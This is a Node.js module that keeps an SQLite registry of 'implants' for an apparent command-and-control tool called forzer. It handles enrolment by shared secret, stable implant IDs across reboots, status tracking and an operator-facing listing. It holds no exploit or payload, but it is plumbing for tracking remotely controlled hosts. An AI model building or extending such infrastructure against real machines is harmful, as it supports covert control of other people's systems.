'use strict';
/* Implant registry, backed by node:sqlite (built in from Node 22 — no
 * dependency, which matters because this thing is meant to be dropped onto a
 * host and run).
 *
 * This exists so an implant is recognisable across reboots. Previously `id` was
 * `crypto.randomBytes(8)` regenerated on every connection, so a rebooted bot
 * rejoined as an unfamiliar device and the operator's list churned.
 *
 * Deliberately not built yet: tasks, audit, listeners, tags. Those were not in
 * scope for the identity work and the tables are cheap to add when they are.
 */
const fs = require('node:fs');
const path = require('node:path');
const { DatabaseSync } = require('node:sqlite');
const identity = require('./identity');

const DEFAULT_DB = path.join(__dirname, '..', 'data', 'forzer.db');

const SCHEMA = `
CREATE TABLE IF NOT EXISTS implants (
  id         TEXT PRIMARY KEY,
  secret     TEXT NOT NULL UNIQUE,
  name       TEXT NOT NULL DEFAULT 'unnamed',
  first_seen INTEGER NOT NULL,
  last_seen  INTEGER NOT NULL,
  status     TEXT NOT NULL DEFAULT 'new'
);
CREATE INDEX IF NOT EXISTS implants_last_seen ON implants (last_seen DESC);
`;

/* Pre-PSK databases stored the implant's ECDH public point in a `pubkey`
   column and the control plane's private key in a `server_key` table. Neither
   is usable any more: the agent cannot reload a CNG private key, so those
   implants are permanently un-authenticatable and keeping their rows would only
   show the operator devices that will never connect. Drop them loudly rather
   than leaving a schema that looks populated and is not.

   CREATE TABLE IF NOT EXISTS will not touch an existing table, so this has to
   run after the schema exec rather than be folded into it. */
function migratePrePskSchema(db) {
  const cols = db.prepare('PRAGMA table_info(implants)').all();
  if (!cols.length) return;              /* fresh database, nothing to do */
  if (cols.some((c) => c.name === 'secret')) return;  /* already current */

  const rows = db.prepare('SELECT COUNT(*) AS n FROM implants').get();
  console.warn(
    `[store] dropping ${rows.n} pre-PSK implant record(s): the ECDH identities they\n`
    + '        point at can no longer authenticate. They must re-enrol, and will\n'
    + '        appear as new devices.');
  db.exec('DROP TABLE IF EXISTS server_key;');
  db.exec('DROP TABLE implants;');
  db.exec(SCHEMA);
}

function open(dbPath = process.env.FORZER_DB || DEFAULT_DB) {
  fs.mkdirSync(path.dirname(dbPath), { recursive: true });
  const db = new DatabaseSync(dbPath);
  db.exec('PRAGMA journal_mode = WAL;');
  db.exec('PRAGMA foreign_keys = ON;');
  db.exec(SCHEMA);
  migratePrePskSchema(db);
  return db;
}

const rowToImplant = (r) => ({
  id: r.id,
  name: r.name,
  secret: r.secret,
  firstSeen: r.first_seen,
  lastSeen: r.last_seen,
  status: r.status,
});

const toWire = (implant) => ({
  id: implant.id,
  name: implant.name,
  status: implant.status,
  firstSeen: implant.firstSeen,
  lastSeen: implant.lastSeen,
});

class Registry {
  constructor(db) {
    this.db = db;
  }

  /* Look up an implant by its enrolled secret. Returns null when the secret has
     never been seen, which is the only thing that distinguishes a first
     check-in from a returning one. */
  bySecret(secretB64) {
    const r = this.db.prepare('SELECT * FROM implants WHERE secret = ?').get(secretB64);
    return r ? rowToImplant(r) : null;
  }

  byId(id) {
    const r = this.db.prepare('SELECT * FROM implants WHERE id = ?').get(id);
    return r ? rowToImplant(r) : null;
  }

  /* Enroll on first sight of a secret. The id is derived from it, so it is
     deterministic: a racing double-enrolment of the same secret produces the
     same id and the UNIQUE constraint turns the loser into a no-op. */
  enroll(secretB64, name) {
    const secret = Buffer.from(secretB64, 'base64');
    const id = identity.implantId(secret);
    const now = Date.now();
    try {
      this.db.prepare(
        'INSERT INTO implants (id, secret, name, first_seen, last_seen, status) VALUES (?, ?, ?, ?, ?, ?)'
      ).run(id, secretB64, name, now, now, 'new');
    } catch (e) {
      /* UNIQUE violation: another connection enrolled the same secret first. Not
         an error — the secret is pinned either way. */
      if (!/UNIQUE|constraint/i.test(String(e && e.message))) throw e;
    }
    return this.byId(id);
  }

  /* A successful check-in. `status` moves new -> online on the first one and is
     set to offline by the caller on disconnect. */
  markOnline(id, name) {
    this.db.prepare('UPDATE implants SET last_seen = ?, status = ? WHERE id = ?')
      .run(Date.now(), 'online', id);
    if (name) this.db.prepare('UPDATE implants SET name = ? WHERE id = ?').run(name, id);
    return this.byId(id);
  }

  markOffline(id) {
    this.db.prepare('UPDATE implants SET status = ? WHERE id = ?').run('offline', id);
  }

  /* What the operator sees, and what the wire payloads carry. Note there is
     no address and no topology — the old overlay-IP field is gone; an implant
     is identified by a key-derived id. Crucially this is the *only* shape that
     leaves the registry: the secret is the credential, so it must never reach
     the dashboard, the roster broadcast, or a forzerctl listing. */
  list() {
    return this.db.prepare('SELECT * FROM implants ORDER BY last_seen DESC')
      .all()
      .map(rowToImplant)
      .map(toWire);
  }

  /* Row count, for the roster cap. Cheap enough to run on the enrolment path
     and it needs no secret material, so it is safe to expose. */
  count() {
    return this.db.prepare('SELECT COUNT(*) AS n FROM implants').get().n;
  }

  toWire(implant) {
    return toWire(implant);
  }
}

module.exports = { open, Registry, toWire, DEFAULT_DB, SCHEMA };
